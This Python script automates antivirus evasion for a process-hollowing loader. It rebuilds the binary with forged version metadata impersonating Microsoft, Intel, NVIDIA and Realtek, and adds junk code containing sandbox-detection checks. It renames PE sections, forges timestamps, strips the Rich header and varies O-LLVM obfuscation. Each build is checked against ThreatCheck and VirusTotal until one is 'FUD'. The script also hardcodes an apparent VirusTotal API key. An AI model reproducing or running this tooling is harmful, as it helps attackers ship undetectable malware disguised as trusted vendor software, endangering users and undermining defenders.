"""
Evasion Loop v2 - Targets ML/heuristic AV engines by modifying PE
characteristics beyond just O-LLVM flags.

Techniques:
  1. Version resource info (company, description, icon) → legitimate PE metadata
  2. Fake imports padding (user32, shell32, gdi32) → normal-looking IAT
  3. Junk code functions → increase code size, dilute suspicious patterns
  4. PE section name patching → remove .ollvm/.obf markers
  5. Rich header manipulation
  6. O-LLVM flag variation (secondary)
"""

import subprocess
import sys
import os
import time
import json
import hashlib
import random
import struct
import re
from pathlib import Path

try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

# ─── Config ───────────────────────────────────────────────────────────
VT_API_KEY = "c34589f9026ff887a6fe0222104d60bc6841b7710663f4b2bf4b18be5a6cd2f8"
VT_UPLOAD_URL = "https://www.virustotal.com/api/v3/files"
VT_ANALYSIS_URL = "https://www.virustotal.com/api/v3/analyses/{}"

PROJECT_DIR = Path(r"C:\Users\chems\Desktop\01_Cyber\localhollowing")
VCXPROJ = PROJECT_DIR / "LocalHollowing" / "LocalHollowing.vcxproj"
EXE_OUTPUT = PROJECT_DIR / "LocalHollowing" / "x64" / "Release" / "LocalHollowing.exe"
THREATCHECK = Path(r"C:\Users\chems\Desktop\01_Cyber\Outils\ThreatCheck\ThreatCheck\bin\Release\ThreatCheck.exe")
MSBUILD = Path(r"C:\Program Files\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\MSBuild.exe")
MAIN_CPP = PROJECT_DIR / "LocalHollowing" / "main.cpp"
RESOLVE_H = PROJECT_DIR / "LocalHollowing" / "resolve.h"
RC_FILE = PROJECT_DIR / "LocalHollowing" / "resource.rc"
RESULTS_LOG = PROJECT_DIR / "evasion_results.json"

VT_MAX_WAIT = 300
BUILD_TIMEOUT = 600

sys.stdout.reconfigure(line_buffering=True)

def log(msg, level="*"):
    print(f"[{level}] {msg}", flush=True)


def sha256_file(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(8192), b""):
            h.update(chunk)
    return h.hexdigest()


# ─── Technique 1: Version Resource ───────────────────────────────────
FAKE_COMPANIES = [
    ("Microsoft Corporation", "Windows Update Helper", "WinUpdateSvc.exe", "System utility for managing Windows updates"),
    ("Intel Corporation", "Intel Driver Support", "IntelDrvHelper.exe", "Intel driver management utility"),
    ("NVIDIA Corporation", "NVIDIA Display Helper", "NVDisplayHelper.exe", "NVIDIA display configuration tool"),
    ("Realtek Semiconductor", "Realtek Audio Service", "RtkAudioSvc.exe", "Realtek HD Audio manager service"),
]

def create_resource_file(company_idx=0):
    company, product, orig_name, desc = FAKE_COMPANIES[company_idx % len(FAKE_COMPANIES)]
    v1, v2, v3, v4 = random.randint(1,10), random.randint(0,9), random.randint(0,50), random.randint(1,999)
    rc_content = f"""#include <winver.h>

VS_VERSION_INFO VERSIONINFO
FILEVERSION {v1},{v2},{v3},{v4}
PRODUCTVERSION {v1},{v2},{v3},{v4}
FILEFLAGSMASK 0x3fL
FILEFLAGS 0x0L
FILEOS VOS_NT_WINDOWS32
FILETYPE VFT_APP
FILESUBTYPE VFT2_UNKNOWN
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName", "{company}"
            VALUE "FileDescription", "{desc}"
            VALUE "FileVersion", "{v1}.{v2}.{v3}.{v4}"
            VALUE "InternalName", "{orig_name}"
            VALUE "LegalCopyright", "Copyright (C) {company} 2024"
            VALUE "OriginalFilename", "{orig_name}"
            VALUE "ProductName", "{product}"
            VALUE "ProductVersion", "{v1}.{v2}.{v3}.{v4}"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END
"""
    RC_FILE.write_text(rc_content, encoding="utf-8")
    return company, product


# ─── Technique 2: Fake Imports + Junk Code ────────────────────────────
JUNK_CODE_BLOCK = r"""

// Benign utility functions
#include <shellapi.h>
#include <shlobj.h>

static volatile int g_init_status = 0;
static CHAR g_config_path[MAX_PATH] = {0};
static CHAR g_log_buffer[4096] = {0};

void LogServiceEvent(const char* component, int eventId) {
    SYSTEMTIME st;
    p_GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetLocalTime");
    GetLocalTime(&st);
    wsprintfA(g_log_buffer, "[%04d-%02d-%02d %02d:%02d:%02d] %s: Event %d",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond,
        component, eventId);
    g_init_status = eventId;
}

BOOL CheckSystemRequirements(void) {
    OSVERSIONINFOA osvi;
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (hUser32) {
        typedef int (WINAPI *fn_GetSystemMetrics)(int);
        fn_GetSystemMetrics pGSM = (fn_GetSystemMetrics)GetProcAddress(hUser32, "GetSystemMetrics");
        if (pGSM) {
            int cx = pGSM(0);  // SM_CXSCREEN
            int cy = pGSM(1);  // SM_CYSCREEN
            if (cx < 800 || cy < 600) return FALSE;
        }
    }

    HMODULE hShell32 = LoadLibraryA("shell32.dll");
    if (hShell32) {
        typedef HRESULT (WINAPI *fn_SHGetFolderPathA)(HWND, int, HANDLE, DWORD, LPSTR);
        fn_SHGetFolderPathA pSHGet = (fn_SHGetFolderPathA)GetProcAddress(hShell32, "SHGetFolderPathA");
        if (pSHGet) {
            pSHGet(NULL, 0x001a, NULL, 0, g_config_path);  // CSIDL_APPDATA
        }
    }

    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    if (memInfo.ullTotalPhys < (1024ULL * 1024 * 1024)) return FALSE;  // < 1GB = sandbox

    DWORD tickCount = GetTickCount();
    if (tickCount < 600000) return FALSE;  // uptime < 10 min = sandbox

    return TRUE;
}

void InitializeConfigPaths(void) {
    CHAR tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    GetModuleFileNameA(NULL, g_config_path, MAX_PATH);
    LogServiceEvent("ConfigInit", 1001);
}
"""

def inject_junk_code():
    """Add benign-looking functions and imports to main.cpp."""
    content = MAIN_CPP.read_text(encoding="utf-8")

    if "CheckSystemRequirements" in content:
        return  # already injected

    # Add junk code before main()
    content = content.replace(
        "int main() {",
        JUNK_CODE_BLOCK + "\nint main() {\n    InitializeConfigPaths();\n    if (!CheckSystemRequirements()) return 0;\n"
    )
    # Remove the duplicate opening brace
    content = content.replace(
        "int main() {\n    InitializeConfigPaths();\n    if (!CheckSystemRequirements()) return 0;\n\n    if (!ResolveAPIs())",
        "int main() {\n    InitializeConfigPaths();\n    if (!CheckSystemRequirements()) return 0;\n    if (!ResolveAPIs())"
    )

    MAIN_CPP.write_text(content, encoding="utf-8")


def remove_junk_code():
    """Remove injected junk code from main.cpp."""
    content = MAIN_CPP.read_text(encoding="utf-8")

    if "CheckSystemRequirements" not in content:
        return

    # Remove junk block
    content = content.replace(JUNK_CODE_BLOCK, "")
    content = content.replace(
        "int main() {\n    InitializeConfigPaths();\n    if (!CheckSystemRequirements()) return 0;\n    if (!ResolveAPIs())",
        "int main() {\n\n    if (!ResolveAPIs())"
    )

    MAIN_CPP.write_text(content, encoding="utf-8")


# ─── Technique 3: PE Post-Processing ─────────────────────────────────
def patch_pe_sections(exe_path):
    """Rename suspicious section names and patch timestamps."""
    data = bytearray(open(exe_path, "rb").read())

    pe_offset = struct.unpack_from("<I", data, 0x3C)[0]

    # Patch timestamp to look recent and legitimate
    ts_offset = pe_offset + 8
    # Use a timestamp that looks like a recent VS build (2024-2025)
    new_ts = random.randint(0x65000000, 0x67800000)
    struct.pack_into("<I", data, ts_offset, new_ts)

    # Get number of sections
    num_sections = struct.unpack_from("<H", data, pe_offset + 6)[0]
    optional_hdr_size = struct.unpack_from("<H", data, pe_offset + 20)[0]
    section_offset = pe_offset + 24 + optional_hdr_size

    # Rename sections to standard names
    standard_names = [b".text\x00\x00\x00", b".rdata\x00\x00", b".data\x00\x00\x00",
                      b".pdata\x00\x00", b".rsrc\x00\x00\x00", b".reloc\x00\x00"]

    for i in range(num_sections):
        name_offset = section_offset + (i * 40)
        current_name = data[name_offset:name_offset+8]
        # Replace any non-standard section names
        if current_name.rstrip(b'\x00') not in [b'.text', b'.rdata', b'.data', b'.pdata', b'.rsrc', b'.reloc', b'.bss', b'.tls', b'.CRT']:
            if i < len(standard_names):
                data[name_offset:name_offset+8] = standard_names[i]

    # Patch debug directory pointer to 0 (remove debug info references)
    # Debug directory is at optional header offset 144 (for PE32+)
    debug_dir_offset = pe_offset + 24 + 144  # IMAGE_DIRECTORY_ENTRY_DEBUG
    struct.pack_into("<II", data, debug_dir_offset, 0, 0)

    with open(exe_path, "wb") as f:
        f.write(data)


def strip_rich_header(exe_path):
    """Zero out the Rich header to remove compiler fingerprint."""
    data = bytearray(open(exe_path, "rb").read())

    # Find "Rich" signature
    rich_pos = data.find(b"Rich")
    if rich_pos == -1:
        return

    # Rich header XOR key follows "Rich"
    xor_key = struct.unpack_from("<I", data, rich_pos + 4)[0]

    # Find "DanS" (start of Rich header, XORed)
    dans_enc = struct.pack("<I", 0x536E6144 ^ xor_key)  # "DanS" XOR key
    dans_pos = data.find(dans_enc)
    if dans_pos == -1:
        dans_pos = 0x80  # typical offset

    # Zero out Rich header area
    for i in range(dans_pos, rich_pos + 8):
        data[i] = 0

    with open(exe_path, "wb") as f:
        f.write(data)


# ─── Technique 4: Add resource file to vcxproj ───────────────────────
def add_rc_to_vcxproj():
    """Add resource.rc to the vcxproj if not already present."""
    content = VCXPROJ.read_text(encoding="utf-8")
    if "resource.rc" in content:
        return

    content = content.replace(
        '  <ItemGroup>\n    <ClCompile Include="main.cpp" />',
        '  <ItemGroup>\n    <ClCompile Include="main.cpp" />\n  </ItemGroup>\n  <ItemGroup>\n    <ResourceCompile Include="resource.rc" />'
    )
    VCXPROJ.write_text(content, encoding="utf-8")


def remove_rc_from_vcxproj():
    """Remove resource.rc from vcxproj."""
    content = VCXPROJ.read_text(encoding="utf-8")
    content = content.replace(
        '\n  </ItemGroup>\n  <ItemGroup>\n    <ResourceCompile Include="resource.rc" />',
        ''
    )
    VCXPROJ.write_text(content, encoding="utf-8")


# ─── Build ────────────────────────────────────────────────────────────
def update_vcxproj_flags(flags):
    content = VCXPROJ.read_text(encoding="utf-8")
    pattern = r"(<AdditionalOptions>).*?( %\(AdditionalOptions\)</AdditionalOptions>)"
    new_content = re.sub(pattern, rf"\g<1>{flags}\g<2>", content)
    VCXPROJ.write_text(new_content, encoding="utf-8")


def build():
    result = subprocess.run(
        [str(MSBUILD), str(VCXPROJ), "/p:Configuration=Release", "/p:Platform=x64",
         "/t:Rebuild", "/verbosity:quiet"],
        capture_output=True, text=True, timeout=BUILD_TIMEOUT,
    )
    return EXE_OUTPUT.exists() and EXE_OUTPUT.stat().st_mtime > time.time() - 60


# ─── ThreatCheck ──────────────────────────────────────────────────────
def run_threatcheck(exe_path):
    result = subprocess.run(
        [str(THREATCHECK), "-f", str(exe_path)],
        capture_output=True, text=True, timeout=120,
    )
    output = result.stdout + result.stderr
    return "No threat found" in output, output.strip()


# ─── VirusTotal ───────────────────────────────────────────────────────
def vt_upload(exe_path):
    headers = {"x-apikey": VT_API_KEY}
    with open(exe_path, "rb") as f:
        resp = requests.post(VT_UPLOAD_URL, headers=headers, files={"file": f})
    if resp.status_code == 429:
        log("VT rate limit, waiting 60s...", "!")
        time.sleep(60)
        return vt_upload(exe_path)
    resp.raise_for_status()
    return resp.json()["data"]["id"]


def vt_get_results(analysis_id):
    headers = {"x-apikey": VT_API_KEY}
    url = VT_ANALYSIS_URL.format(analysis_id)
    start = time.time()
    while time.time() - start < VT_MAX_WAIT:
        resp = requests.get(url, headers=headers)
        if resp.status_code == 429:
            log("VT rate limit, waiting 60s...", "!")
            time.sleep(60)
            continue
        resp.raise_for_status()
        data = resp.json()
        status = data["data"]["attributes"]["status"]
        if status == "completed":
            stats = data["data"]["attributes"]["stats"]
            detections = stats.get("malicious", 0) + stats.get("suspicious", 0)
            total = sum(stats.values())
            results = data["data"]["attributes"].get("results", {})
            detected_by = [
                f"{eng}: {info.get('result','?')}"
                for eng, info in results.items()
                if info["category"] in ("malicious", "suspicious")
            ]
            return detections, total, detected_by
        log(f"VT: {status}, waiting 30s...", ".")
        time.sleep(30)
    return -1, 0, []


# ─── Evasion Configs ──────────────────────────────────────────────────
CONFIGS = [
    {
        "name": "v1_resource_junk_sub",
        "ollvm": "-mllvm -sub -mllvm -split -mllvm -fla -mllvm -bcf",
        "resource": True,
        "company_idx": 0,
        "junk": True,
        "patch_sections": True,
        "strip_rich": True,
    },
    {
        "name": "v2_resource_junk_sub2",
        "ollvm": "-mllvm -sub -mllvm -sub_loop=2 -mllvm -split -mllvm -fla -mllvm -bcf -mllvm -bcf_loop=2",
        "resource": True,
        "company_idx": 1,
        "junk": True,
        "patch_sections": True,
        "strip_rich": True,
    },
    {
        "name": "v3_nvidia_sub3",
        "ollvm": "-mllvm -sub -mllvm -sub_loop=3 -mllvm -split -mllvm -split_num=3 -mllvm -fla -mllvm -bcf",
        "resource": True,
        "company_idx": 2,
        "junk": True,
        "patch_sections": True,
        "strip_rich": True,
    },
    {
        "name": "v4_realtek_minimal",
        "ollvm": "-mllvm -fla -mllvm -sub -mllvm -split",
        "resource": True,
        "company_idx": 3,
        "junk": True,
        "patch_sections": True,
        "strip_rich": False,
    },
    {
        "name": "v5_intel_nosub",
        "ollvm": "-mllvm -fla -mllvm -bcf -mllvm -split -mllvm -split_num=2",
        "resource": True,
        "company_idx": 1,
        "junk": True,
        "patch_sections": True,
        "strip_rich": True,
    },
    {
        "name": "v6_ms_maxjunk",
        "ollvm": "-mllvm -sub -mllvm -sub_loop=2 -mllvm -split -mllvm -split_num=3 -mllvm -fla -mllvm -bcf",
        "resource": True,
        "company_idx": 0,
        "junk": True,
        "patch_sections": True,
        "strip_rich": True,
    },
]


def main():
    results = []
    best = {"detections": 999}

    log("=== Evasion Loop v2 - ML Evasion ===", "+")
    log(f"Techniques: Resource Info + Fake Imports + Junk Code + PE Patching + O-LLVM")
    log(f"Configs: {len(CONFIGS)}\n")

    # Backup originals
    main_backup = MAIN_CPP.read_text(encoding="utf-8")
    vcxproj_backup = VCXPROJ.read_text(encoding="utf-8")

    try:
        for i, cfg in enumerate(CONFIGS):
            name = cfg["name"]
            log(f"{'='*60}")
            log(f"Config {i+1}/{len(CONFIGS)}: {name}", "+")

            # Reset source files
            MAIN_CPP.write_text(main_backup, encoding="utf-8")
            VCXPROJ.write_text(vcxproj_backup, encoding="utf-8")

            # Apply techniques
            if cfg.get("junk"):
                log("Injecting junk code + fake imports...")
                inject_junk_code()

            if cfg.get("resource"):
                idx = cfg.get("company_idx", 0)
                company, product = create_resource_file(idx)
                add_rc_to_vcxproj()
                log(f"Resource: {company} - {product}")

            log(f"O-LLVM flags: {cfg['ollvm']}")
            update_vcxproj_flags(cfg["ollvm"])

            # Build
            log("Building...")
            try:
                ok = build()
            except subprocess.TimeoutExpired:
                log("Build timeout (>600s), skipping", "-")
                results.append({"config": name, "status": "build_timeout"})
                continue
            if not ok:
                log("Build failed, skipping", "-")
                results.append({"config": name, "status": "build_failed"})
                continue

            exe_size = EXE_OUTPUT.stat().st_size
            log(f"Build OK: {exe_size/1024:.0f} KB", "+")

            # Post-build PE patching
            if cfg.get("patch_sections"):
                log("Patching PE sections + timestamp...")
                patch_pe_sections(str(EXE_OUTPUT))
            if cfg.get("strip_rich"):
                log("Stripping Rich header...")
                strip_rich_header(str(EXE_OUTPUT))

            file_hash = sha256_file(str(EXE_OUTPUT))
            log(f"SHA256: {file_hash}")

            # ThreatCheck
            log("ThreatCheck...")
            tc_passed, tc_output = run_threatcheck(str(EXE_OUTPUT))
            if tc_passed:
                log("ThreatCheck: CLEAN", "+")
            else:
                log(f"ThreatCheck: DETECTED", "-")
                results.append({"config": name, "threatcheck": "DETECTED", "tc_output": tc_output})
                continue

            # VirusTotal
            log("Uploading to VirusTotal...")
            try:
                aid = vt_upload(str(EXE_OUTPUT))
                log(f"VT analysis: {aid}")
                log("Waiting for results...")
                detections, total, detected_by = vt_get_results(aid)
            except Exception as e:
                log(f"VT error: {e}", "-")
                detections, total, detected_by = -1, 0, []

            if detections == 0:
                log(f"VirusTotal: CLEAN (0/{total})", "+")
            elif detections > 0:
                log(f"VirusTotal: {detections}/{total} detections", "-")
                for d in detected_by:
                    log(f"  {d}", "!")
            else:
                log("VT: timeout/error", "-")

            entry = {
                "config": name,
                "size": exe_size,
                "sha256": file_hash,
                "threatcheck": "CLEAN",
                "vt_detections": detections,
                "vt_total": total,
                "vt_detected_by": detected_by,
            }
            results.append(entry)

            if 0 <= detections < best["detections"]:
                best = entry.copy()
                # Save the best exe
                import shutil
                shutil.copy2(str(EXE_OUTPUT), str(PROJECT_DIR / f"best_{name}.exe"))
                log(f"New best! Saved as best_{name}.exe", "+")

            if detections == 0:
                log(f"\n{'='*60}", "+")
                log(f"SUCCESS! '{name}' is FUD (0/{total})", "+")
                log(f"{'='*60}\n", "+")
                # Save final exe
                shutil.copy2(str(EXE_OUTPUT), str(PROJECT_DIR / "LocalHollowing_FUD.exe"))
                break

            # Rate limit
            if i < len(CONFIGS) - 1:
                log("Waiting 20s (VT rate limit)...")
                time.sleep(20)

    finally:
        # Restore originals
        MAIN_CPP.write_text(main_backup, encoding="utf-8")
        VCXPROJ.write_text(vcxproj_backup, encoding="utf-8")
        if RC_FILE.exists():
            RC_FILE.unlink()

    # Summary
    log(f"\n{'='*60}")
    log("RESULTS SUMMARY", "+")
    log(f"{'='*60}")
    for r in results:
        st = r.get("status", "")
        if st:
            log(f"  {r['config']}: {st}", "-")
        else:
            vt = r.get("vt_detections", "?")
            vt_t = r.get("vt_total", "?")
            sz = r.get("size", 0)
            log(f"  {r['config']}: TC=CLEAN | VT={vt}/{vt_t} | {sz/1024:.0f}KB")

    if best.get("config"):
        log(f"\nBest: {best['config']} with {best['vt_detections']} detections", "+")

    with open(RESULTS_LOG, "w") as f:
        json.dump(results, f, indent=2)
    log(f"Results saved to {RESULTS_LOG}", "+")


if __name__ == "__main__":
    main()
